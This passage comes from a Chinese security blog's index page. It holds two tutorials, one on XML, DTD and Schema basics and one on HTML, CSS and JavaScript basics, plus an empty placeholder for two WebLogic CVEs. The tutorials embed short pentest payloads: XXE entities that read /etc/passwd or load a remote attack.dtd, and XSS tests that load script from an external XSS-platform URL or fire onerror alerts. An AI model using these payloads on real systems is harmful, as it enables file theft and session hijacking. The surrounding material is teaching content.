<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><h2 id="CVE-2018-3191"><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h2><p>还没复现,先放这里</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/08/java_web_xml/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/08/java_web_xml/" itemprop="url">基础知识 | XML基础</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-08T08:15:41+08:00">
                2018-11-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h2 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h2><p>XML是一种用于标记电子文件使其具有结构性的标记语言，用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
<p>xml<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-05.14.32.24-image.png" alt="2018-11-05.14.32.24-image.png"></p>
<p>与html区别:    </p>
<pre><code>a.html主要用于显示数据,而xml是为了传输与存储数据的
b.html是不区分大小写的,而xml严格区分大小写
c.html有多个根元素,格式良好的xml只有一个根元素
d.html的空格自动过滤,xml的空格不会自动删除
e.html的标签是预定义的,而xml的标记可以根据需要自定义,且可扩展
</code></pre><p>文档声明    </p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;    
</code></pre><p>元素定义:<code>&lt;城市&gt;临汾&lt;/城市&gt;</code>就是文档中的标记,如果一个元素没有嵌套在其他元素内且没有包含内容,这样的元素称为空元素。</p>
<p>属性定义:<code>&lt;售价 单位=&quot;元&quot;&gt;10&lt;/售价&gt;</code>,这里的单位即为属性,属性的命名规范与元素相同,属性值必须用”或’引起来,否则会报错<br>注释:与html的注释符一样<code>&lt;!--注释信息-- &gt;</code></p>
<h3 id="DTD约束："><a href="#DTD约束：" class="headerlink" title="DTD约束："></a>DTD约束：</h3><p>dtd约束是早期出现的一种XML约束模式语言,根据其约束的语法创建的文件称为DTD文件。</p>
<pre><code>xml文件:
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE 书架 SYSTEM &quot;test.dtd&quot;&gt;
&lt;书架&gt;
    &lt;书&gt;
        &lt;书名&gt;java&lt;/书名&gt;
        &lt;作者&gt;admin&lt;/作者&gt;
        &lt;售价&gt;100&lt;/售价&gt;
    &lt;/书&gt;
&lt;/书架&gt;

dtd文件:
&lt;!ELEMENT 书架 (书+)&gt;
&lt;!ELEMENT 书 (书名,作者,售价)&gt;
&lt;!ELEMENT 书名 (#PCDATA)&gt;
&lt;!ELEMENT 作者 (#PCDATA)&gt;
&lt;!ELEMENT 售价 (#PCDATA)&gt;
</code></pre><h4 id="DTD文件的引用"><a href="#DTD文件的引用" class="headerlink" title="DTD文件的引用"></a>DTD文件的引用</h4><p>a.引用本地<code>dtd</code>文件:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-05.15.45.34-image.png" alt="2018-11-05.15.45.34-image.png"></p>
<p>b.引用外部<code>dtd</code>文件:<br>&lt;!DOCTYPE a SYSTEM “<a href="http://www.xxx.cn/test.dtd&quot;&gt;" target="_blank" rel="noopener">http://www.xxx.cn/test.dtd&quot;&gt;</a></p>
<p>c.内嵌DTD内容:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--standalone:是否依赖于外部文件--&gt;
&lt;!DOCTYPE 书架 [
    &lt;!ELEMENT 书架 (书+)&gt;
    &lt;!ELEMENT 书 (书名,作者,售价)&gt;
    &lt;!ELEMENT 书名 (#PCDATA)&gt;
    &lt;!ELEMENT 作者 (#PCDATA)&gt;
    &lt;!ELEMENT 售价 (#PCDATA)&gt;
]&gt;
&lt;书架&gt;
    &lt;书&gt;
        &lt;书名&gt;java&lt;/书名&gt;
        &lt;作者&gt;admin&lt;/作者&gt;
        &lt;售价&gt;100&lt;/售价&gt;
    &lt;/书&gt;
&lt;/书架&gt;
</code></pre><p>在渗透过程中,xxe漏洞常利用的payload:</p>
<pre><code>#读取etc/passwd文件:
&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
&lt;!DOCTYPE a [ &lt;!ENTITY % d SYSTEM &quot;http://www.xxx.cn/attack.dtd&quot;&gt; %d; ]&gt;
&lt;!DOCTYPE a SYSTEM &quot;http://www.xxx.cn/attack.dtd&quot;&gt;

DTD文件:
&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
</code></pre><h3 id="Schema约束"><a href="#Schema约束" class="headerlink" title="Schema约束"></a>Schema约束</h3><p>同DTD一样,XML Schema也是一种用于定义和描述XML文档结构与内容的模式语言。它克服了DTD的一些局限性。</p>
<pre><code>a.DTD采用的是非XML语法格式,缺乏对文档元素,结构,数据类型的全面描述,而Schema本身采用的就是xml语法格式
b.DTD本身合法性的验证采用的是另一套机制,而XML Schema则采用与XML文档相同的合法性验证机制
c.支持命名空间,张三.书架 张三就为命名空间
d.
</code></pre><p>XML Schema:</p>
<pre><code>定义可出现在文档中的元素
定义可出现在文档中的属性
定义哪个元素是子元素
定义子元素的次序
定义子元素的数目
定义元素是否为空，或者是否可包含文本
定义元素和属性的数据类型
定义元素和属性的默认值以及固定值
</code></pre><p>最简单的Schema文档:</p>
<pre><code>#Simple.xsd
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;xs:schema xmlns:xs=&quot;http://w3.org/2001/XMLSchema&quot;&gt;
    &lt;xs:element name=&quot;root&quot; type=&quot;xs:string&quot; /&gt;
&lt;/xs:schema&gt;
</code></pre><p><code>xs:schema</code>是根元素,表示模式定义的开始,由于<code>xs:schema</code>的属性都在<code>http://w3.org/2001/XMLSchema</code>的名称空间,因此,在根元素必须声明该名称空间.</p>
<h4 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间:"></a>名称空间:</h4><p>举个简单例子便于理解:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;it315:书架 xmlns:it315=&quot;http://www.it315.org/xmlbook/schema&quot;&gt;
    &lt;it315:书&gt;
        &lt;it315:书名&gt;java&lt;/it315:书名&gt;
        &lt;it315:作者&gt;admin&lt;/it315:作者&gt;
        &lt;it315:售价&gt;28:00rmb&lt;/it315:售价&gt;
    &lt;/it315:书&gt;
&lt;/it315:书架&gt;
</code></pre><p>名称空间的应用就是将前缀(<code>it315</code>)与一个<code>URI(http://www.it315.org/xmlbook/schema)</code>关联起来</p>
<h4 id="引入Schema文档"><a href="#引入Schema文档" class="headerlink" title="引入Schema文档"></a>引入Schema文档</h4><p>若想通过XML Schema文件对某个xml文件进行约束时,必须将XML文档与Schema文件进行关联。在xml文档引入Schema文件有使用名称空间及不使用名称空间2种方法.</p>
<pre><code>#使用空间名称
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;书架 xmls=&quot;http://www.it315.org/xmlbook/schema&quot;   //引入xmls
      xmls:demo=&quot;http://www.it315.org/demo/schema&quot; //引入xmls下的demo
      xmls:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  //引入xmls下的xsi
      xsi:schemaLocation=&quot;http://www.it315.org/xmlbook/schema   //xsi名称空间名
                          http://www.it315.org/xmlbook.xsd        //文档位置
                          http://www.it315.org/demo/schema        //demo名称空间名
                          http://www.it315.org/demo.xsd&quot;&gt;        //文档位置
      &lt;书&gt;
        &lt;书名&gt;java&lt;/书名&gt;
        &lt;作者&gt;admin&lt;/作者&gt;
        &lt;售价 demo:币种=&quot;人民币&quot;&gt;11&lt;/售价&gt;
      &lt;/书&gt;

&lt;/书架&gt;


#不使用空间名称 xmlbook.xsd与test.xml位于同一目录中
test.xml
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;书架 xmls:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
      xsi:noNamespaceSchemaLocation=&quot;xmlbook.xsd&quot;&gt;
      &lt;书&gt;
        &lt;书名&gt;java&lt;/书名&gt;
        &lt;作者&gt;admin&lt;/作者&gt;
        &lt;售价&gt;11&lt;/售价&gt;
      &lt;/书&gt;

&lt;/书架&gt;
</code></pre><p>更多元素与语法参考:<a href="http://www.w3school.com.cn/schema/schema_elements_ref.asp" target="_blank" rel="noopener">XML Schema 参考手册</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/07/java_web_前端基础/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/07/java_web_前端基础/" itemprop="url">基础知识 | 前端基础知识</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-07T08:15:41+08:00">
                2018-11-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>HTML,超文本标记语言,主要作用是通过HTML标记对网页中文本,图片,声音等进行描述。<br>一个最基本的html文档:</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;This is title&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>各个标签:    </p>
<pre><code>单双标记:&lt;hr /&gt;  &lt;html&gt;&lt;/html&gt;    
段落：&lt;p&gt;&lt;/p&gt;     
换行:&lt;br /&gt;
文本样式:&lt;font face=&quot;微软雅黑&quot; size=&quot;7&quot; color=&quot;green&quot;&gt;&lt;br /&gt;文本1&lt;/font&gt;
图像:&lt;img src=&quot;/1.jpg&quot; width=&quot;100&quot; height=&quot;111&quot; border=&quot;0&quot; /&gt;
表格：//使得网页中的数据能够有条理地显示,可使用表格对网页进行规划
&lt;table&gt;//表格
    &lt;tr&gt;//行
        &lt;td&gt;单元格&lt;/td&gt;//列
        &lt;td&gt;单元格1&lt;/td&gt;
        &lt;td&gt;单元格2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;单元格4&lt;/td&gt;
        &lt;td&gt;单元格5&lt;/td&gt;
        &lt;td&gt;单元格6&lt;/td&gt;
    &lt;/tr&gt;
&lt;/table&gt;

表单:由表单控件,提示信息,表单域3部分组成
&lt;form action=&quot;#&quot; method=&quot;post&quot; name=&quot;表单名称&quot;&gt;  //#表示提交到当前页面
    &lt;input type=&quot;控件类型&quot; /&gt; //除type属性,常用的id name value size
    //控件类型 text(文本输入)  password(密码) radio(单选框) 复选框(checkbox) 上传控件(file) 提交(submit) 重置(reset)
&lt;/form&gt;

注释:&lt;!--注释内容--&gt;
多行文本:&lt;textarea&gt;&lt;/textarea&gt;    
超链接标记:&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot;&gt;百度&lt;/a&gt;  //新窗口打开
         &lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_self&quot;&gt;百度&lt;/a&gt;  //本窗口打开

&lt;div&gt;标记:常与css搭配使用
列表标记:
    无序列表:&lt;ul&gt;&lt;/ul&gt;
    &lt;ul&gt;//定义无序列表
        &lt;li type=&quot;disc&quot;&gt;列1&lt;/li&gt;  //&lt;li&gt;&lt;/li&gt;描述具体列表项 type有3种 分别为:disc square circle,默认属性为disc
        &lt;li type=&quot;square&quot;&gt;列2&lt;/li&gt;
        &lt;li type=&quot;circle&quot;&gt;列3&lt;/li&gt;
    &lt;/ul&gt;
</code></pre><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><p>CSS用于增强控制网页样式并允许将样式信息与网页内容分离的一种标记性语言。在实际中主要用于设置显示样式。<br>定义规则:</p>
<pre><code>选择器{属性一:属性值一; 属性二:属性值二;} /*选择器指定对象 属性设置*/
</code></pre><h3 id="CSS引用方式"><a href="#CSS引用方式" class="headerlink" title="CSS引用方式"></a>CSS引用方式</h3><p>引用方式一共有4种,分别为链入式,行内式,内嵌式和导入式。<br>例子:</p>
<pre><code>  #内嵌式:style写在head头部标记中
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;style type=&quot;text/css&quot;&gt;
        h2{ text-align: center; }/*h2标签的内容居中*/
        div{ border: 1px solid red; width: 300px; height: 300px; color: blue; }
        /*div为选择器,表示css作用的html对象 边框,宽度和高度; 1px solid red表示1像素 实心边框线 红色*/
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h2&gt;hello css&lt;/h2&gt;
    &lt;div id=&quot;div1&quot;&gt;
        &lt;p id=&quot;p1&quot;&gt;hello p1&lt;/p&gt;
        &lt;p id=&quot;p2&quot;&gt;hello p2&lt;/p&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

#链入式:像js一样引入css文件即可
&lt;link href=&quot;test_demo.css&quot; type=&quot;text/css&quot; rel=&quot;stylesheet&quot; /&gt;  //rel:声明当前文档与被链接文档之间的关系 stylesheet表示样式表文件  且css文件中不写&lt;style&gt;&lt;/style&gt;
</code></pre><h3 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a>常用属性</h3><pre><code>a.标记选择器 标记名{属性名1:属性值1; 属性2:属性值2;}
b.类选择器    .类名{属性名1:属性值1; 属性2:属性值2;}
c.id选择器     #id{属性名1:属性值1; 属性2:属性值2;}
d.通配符选择器 *{属性名1:属性值1; 属性2:属性值2;}
</code></pre><p>例子用了类与id选择器:</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;style type=&quot;text/css&quot;&gt;
        /*类选择器*/
        .red {
            color: red;
        }
        .green {
            color: green;
        }
        .font18 {
            font-size: 18px;
        }

        /*#_id选择器*/
        #p1 {
            font-weight: bold;
        }
        #p2 {
            font-size: 24px;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;!--类选择器的使用--&gt;
    &lt;h1 class=&quot;red&quot;&gt;标题1: class=&quot;red&quot;&lt;/h1&gt;
    &lt;h1 class=&quot;green font18&quot;&gt;标题1: 绿色,字号为18px&lt;/h1&gt;
    &lt;h1 class=&quot;red font18&quot;&gt;标题1: 红色,字号为18px&lt;/h1&gt;

    &lt;!--id选择器的使用--&gt;
    &lt;p id=&quot;p1&quot;&gt;段落1:设置为粗体&lt;/p&gt;
    &lt;p id=&quot;p2&quot;&gt;段落2:字号为24&lt;/p&gt;
    &lt;p id=&quot;p2 p1&quot;&gt;段落:粗体+字号为24&lt;/p&gt;&lt;!--错误的  同一个标记对象不能同时引用多个id--&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>更多属性参考:<a href="http://www.w3school.com.cn/cssref/index.asp" target="_blank" rel="noopener">CSS 参考手册</a></p>
<h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><h3 id="JavaScript-HTML-DOM"><a href="#JavaScript-HTML-DOM" class="headerlink" title="JavaScript HTML DOM"></a>JavaScript HTML DOM</h3><p>当网页被加载时,浏览器会创建页面的文档对象模型(Document Object Model)<br>html dom模型被构造为对象的树<br>HTML DOM树：<br><img src="http://www.w3school.com.cn/i/ct_htmltree.gif" alt="xxxx">    </p>
<p>通过可编程的对象模型,js获得了足够的能力来创建动态的html。    </p>
<blockquote>
<p>JavaScript 能够改变页面中的所有 HTML 元素<br>JavaScript 能够改变页面中的所有 HTML 属性<br>JavaScript 能够改变页面中的所有 CSS 样式<br>JavaScript 能够对页面中的所有事件做出反应    </p>
</blockquote>
<h3 id="DOM-HTML"><a href="#DOM-HTML" class="headerlink" title="DOM HTML"></a>DOM HTML</h3><p>JavaScript 能够改变页面中的所有<code>HTML</code>元素及属性<br>a.通过元素的id属性获取元素</p>
<pre><code>#获取id属性的值为userid节点的代码:
document.getElementById(&quot;userid&quot;)
</code></pre><p>b.通过元素的name属性获取元素(由于多个元素可能有相同的name值,所以返回的是一个数组,通过其下标元素进行获取)</p>
<pre><code>#获取name属性的值为userid节点的代码:
document.getElementByName(&quot;username&quot;)[0]
</code></pre><p>c.改变HTML元素的内容</p>
<pre><code>#直接向HTML输出流写内容:
&lt;script&gt;
    document.write(Date());
&lt;/script&gt;

#改变 HTML 内容:
document.getElementById(id).innerHTML=new HTML

#改变id为p2的src属性值:
document.getElementById(&quot;p2&quot;).src = &quot;xxx.jpg&quot;;
</code></pre><h3 id="DOM-CSS"><a href="#DOM-CSS" class="headerlink" title="DOM CSS"></a>DOM CSS</h3><p>JavaScript 能够改变页面中的所有 CSS 样式</p>
<h3 id="DOM-事件"><a href="#DOM-事件" class="headerlink" title="DOM 事件"></a>DOM 事件</h3><p>HTML DOM 使 JavaScript 有能力对 HTML 事件做出反应。</p>
<pre><code>#点击文本变为test
&lt;h1 onclick=&quot;this.innerHTML=&apos;test&apos;&quot;&gt;请点击该文本&lt;/h1&gt;

&lt;h1 onclick=&quot;xxx(this)&quot;&gt;请点击该文本&lt;/h1&gt;
function xxx(id){
        id.innerHTML=&apos;test&apos;;
    }
</code></pre><p>html事件属性:</p>
<pre><code>#点击按钮后,运行displayDate()函数
&lt;button onclick=&quot;displayDate()&quot;&gt;点击这里&lt;/button&gt;

#根据id添加onclick事件,当按钮被点击后,执行displayDate()函数
document.getElementById(&quot;myButn&quot;).onclick = function(){displayDate()};
</code></pre><p>利用onload处理cookie:</p>
<pre><code>&lt;body onload=&quot;checkCookies()&quot;&gt;
&lt;script&gt;
function checkCookies()
{
if (navigator.cookieEnabled==true)
    {
    alert(&quot;已启用 cookie&quot;)
    }
else
    {
    alert(&quot;未启用 cookie&quot;)
    }
}
&lt;/script&gt;
</code></pre><p> 此外,常用的事件还有onchange,onmouseover,onmouseout等等</p>
<h3 id="DOM-节点"><a href="#DOM-节点" class="headerlink" title="DOM 节点"></a>DOM 节点</h3><p> 创建新的HTML元素:如需向HTML DOM添加新元素,必须先创建该元素节点,然后向一个已经存在的元素追加该元素</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div id=&quot;div1&quot;&gt;
        &lt;p id=&quot;p1&quot;&gt;hello p1&lt;/p&gt;
        &lt;p id=&quot;p2&quot;&gt;hello p2&lt;/p&gt;
    &lt;/div&gt;
    &lt;script type=&quot;text/javascript&quot;&gt;
        var para = document.createElement(&apos;p3&apos;);//创建一个P3标签
        var node = document.createTextNode(&apos;hello p3&apos;);//创建一个文本节点
        para.appendChild(node);//向P3元素添加文本内容

        var element = document.getElementById(&apos;div1&apos;);//找到一个已有元素
        element.appendChild(para);//追加新元素
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p> 删除已有的html元素:如需删除HTML元素,必须首先获得该元素的父元素</p>
<pre><code> &lt;body&gt;
    &lt;div id=&quot;div1&quot;&gt;
        &lt;p id=&quot;p1&quot;&gt;hello p1&lt;/p&gt;
        &lt;p id=&quot;p2&quot;&gt;hello p2&lt;/p&gt;
    &lt;/div&gt;
    &lt;script type=&quot;text/javascript&quot;&gt;
        var parent = document.getElementById(&apos;div1&apos;);
        var child = document.getElementById(&apos;p1&apos;);
        parent.removeChild(child);
    &lt;/script&gt;
&lt;/body&gt;
</code></pre><p> 在不引用父元素的情况下删除某个元素,使用parentNode属性来找到父元素</p>
<pre><code>var child = document.getElementById(&apos;p2&apos;);
hild.parentNode.removeChild(child);
</code></pre><h3 id="javascript的引入方式"><a href="#javascript的引入方式" class="headerlink" title="javascript的引入方式:"></a>javascript的引入方式:</h3><p>内嵌式:</p>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    document.write(&quot;Hello World&quot;)
&lt;/script&gt;
</code></pre><p>外链式:<br>当脚本代码比较复杂或者同一段代码需要被多个网页文件同时使用时,可以将这些脚本代码放置在一个扩展名为.js的文件中,然后通过外链方法引入即可</p>
<pre><code>&lt;script type=&quot;text/javascript&quot; src=&quot;js文件路径&quot;&gt;&lt;/script&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-03.12.37.07-image.png" alt="2018-11-03.12.37.07-image.png"></p>
<p>我们在测试xss漏洞时,使用的就是外链引入,而js代码就存储在xss平台的js文件里,测试payload:</p>
<pre><code>&lt;script src=http://c7.gg/beXLv&gt;&lt;/script&gt;
</code></pre><p>如果直接访问<code>http://c7.gg/beXLv</code>,可以看到js代码。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-03.13.04.01-image.png" alt="2018-11-03.13.04.01-image.png"></p>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型:"></a>数据类型:</h3><table>
<thead>
<tr>
<th>类型</th>
<th>含义</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Number</td>
<td>数值型</td>
<td>不区分整性与浮点型,数值不需要用引号括起来</td>
</tr>
<tr>
<td>String</td>
<td>字符串</td>
<td>‘或”括起来的一个或多个字符</td>
</tr>
<tr>
<td>Boolean</td>
<td>布尔</td>
<td>True,False</td>
</tr>
<tr>
<td>Object</td>
<td>对象</td>
<td>一组数据和功能的键值对集合</td>
</tr>
<tr>
<td>Null</td>
<td>空类型</td>
<td>无任何值</td>
</tr>
<tr>
<td>Undefined</td>
<td>未定义</td>
<td>变量被创建,但未赋值</td>
</tr>
</tbody>
</table>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>使用var声明变量,由于JavaScript为一种弱类型语言,所以在声明时不需要指定变量类型,变量类型由变量的赋值情况来确定,语法格式如下:</p>
<pre><code>var number=1;
var str1=&quot;Hello world&quot;;
</code></pre><p>变量名需遵循命名规则,变量名可由下划线<code>(_)</code>,字母,美元符号($),中文(不建议),不能使用JavaScript的关键字。</p>
<p>需要注意,这些关键字同样不可用作函数名,对象名及自定义的方法名。</p>
<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>a.算术运算符:+ - <em> / ++ –<br>b.比较运算符:&lt; &gt; &lt;= &gt;= ==(只对表面进行比较 “27”==27 true)  !=(表面比较 “27”!=27 false)<br>c.逻辑运算符:&amp;&amp; || !(与 或 非)<br>d.赋值运算符:`= += -+ </em>= /= %=(a%=b相当于a=a%b)`<br>e.条件运算符:操作数?结果一:结果二  (如果操作数的值为true,则表达式结果为1,否则为2)</p>
<h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><p>if必须为小写,当执行语句只有一行时,可以省略<code>{}</code></p>
<pre><code>#单向判断
if(条件)
{
    //code
} 

#双向判断
if(条件){
    //code1
}
else{
    //code1
}

#多向判断:当条件1和条件2都不为true时执行code3的代码
if(条件1){
    //code1    
}
else if(条件2){
    //code2
}
else{
    //code3
}
</code></pre><h3 id="JavaScript的使用"><a href="#JavaScript的使用" class="headerlink" title="JavaScript的使用"></a>JavaScript的使用</h3><p>1.函数定义及调用:<br>定义函数是通过function语句实现的,语法格式:</p>
<pre><code>function FunctionName(par1,par2){
    statements;
    {return expression;}#可返回任意表达式,变量,常量。可省略
}
</code></pre><p>函数名唯一且区分大小写</p>
<h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>采用事件驱动是JavaScript最基本的特征,所谓的事件是指用户在访问页面时执行的操作。事件处理通常分为3步:发生事件,启动事件处理程序,对事件处理程序做出反应。上例子,就明白了:</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-03.14.09.43-image.png" alt="2018-11-03.14.09.43-image.png"></p>
<p>在点击’click me’后,会弹出提示窗口,对用户提示.我们在xss测试中常用的payload:<code>&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;</code><br>除onclick与onerror外,JavaScript还有很多常用的事件类型:</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>当以下情况发生时，出现此事件 </th>
</tr>
</thead>
<tbody>
<tr>
<td>onblur</td>
<td>元素失去焦点</td>
</tr>
<tr>
<td>onchange</td>
<td>用户改变域的内容</td>
</tr>
<tr>
<td>onfocus</td>
<td>元素获得焦点</td>
</tr>
<tr>
<td>onreset</td>
<td>重置按钮被点击</td>
</tr>
<tr>
<td>onsubmit</td>
<td>提交按钮被点击</td>
</tr>
<tr>
<td>onunload</td>
<td>用户退出页面</td>
</tr>
</tbody>
</table>
<h3 id="常用对象"><a href="#常用对象" class="headerlink" title="常用对象"></a>常用对象</h3><p>(1)Windows对象<br>(2)Date对象<br>主要用于处理事件:</p>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    //var myDate=new Date();
    var test=new Date();#创建Date对象

    document.write(test.constructor);//返回Date()

    //2018.11.03 15:19:56  星期六
    document.write(Date());//返回当前时间
    document.write(test.getDate());//3
    document.write(test.getDay());//6
    document.write(test.getMonth());//10
    document.write(test.getFullYear());//2018
    document.write(test.getHours());//15
    document.write(test.getMinutes());//19
    document.write(test.getSeconds());//56
    document.write(test.getTime());//1541229596407 从1970年1月1日至今的毫秒数

    //时间设置类似
&lt;/script&gt;
</code></pre><p>(3)String对象</p>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    //var myDate=new Date();
    var text = &quot;Hello world&quot;;
    var str=&quot;How are you doing today?&quot;

    //对象属性
    document.write(text.length + &quot;&lt;br /&gt;&quot;);//返回text长度 一个汉字也是一个字符


    //对象方法
    document.write(text.indexOf(&apos;Hello&apos;) + &quot;&lt;br /&gt;&quot;);//返回Hello第一次在text出现的位置0  若无则返回-1
    document.write(text.indexOf(&apos;World&apos;) + &quot;&lt;br /&gt;&quot;);//返回-1 因为对大小写敏感

    document.write(text.lastIndexOf(&apos;Hello&apos;) + &quot;&lt;br /&gt;&quot;);//从后往前检索字符串 返回0
    document.write(text.substr(3) + &quot;&lt;br /&gt;&quot;);//返回lo world
    document.write(text.substr(3,7) + &quot;&lt;br /&gt;&quot;);//从3开始 取7个字符 返回lo worl

    document.write(text.substring(3) + &quot;&lt;br /&gt;&quot;);//返回lo world
    document.write(text.substring(3,7) + &quot;&lt;br /&gt;&quot;);//取下标为3到7的字符,返回lo w

    document.write(str.split(&quot; &quot;) + &quot;&lt;br /&gt;&quot;);//根据空返回数组 通过[1] [2]可访问
    document.write(str.split(&quot;&quot;) + &quot;&lt;br /&gt;&quot;);//每个字符都会分割


    document.write(str.search(/are/) + &quot;&lt;br /&gt;&quot;);//检索doing 返回12 大小写敏感
    document.write(str.search(/Are/i) + &quot;&lt;br /&gt;&quot;);//检索doing  大小写不敏感

    document.write(text.replace(/world/, &quot;Z9&quot;) + &quot;&lt;br /&gt;&quot;);//将world替换为Z9
    document.write(text.replace(/world/g, &quot;Z9&quot;) + &quot;&lt;br /&gt;&quot;);//将world全替换为Z9
    document.write(text.replace(/world/i, &quot;Z9&quot;) + &quot;&lt;br /&gt;&quot;);//将world(大小写)全替换为Z9


    document.write(text.toLowerCase() + &quot;&lt;br /&gt;&quot;);//全转化为小写
    document.write(text.toUpperCase() + &quot;&lt;br /&gt;&quot;);//全转化为大写
&lt;/script&gt;
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/01/Sqli-labs Less29-37/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
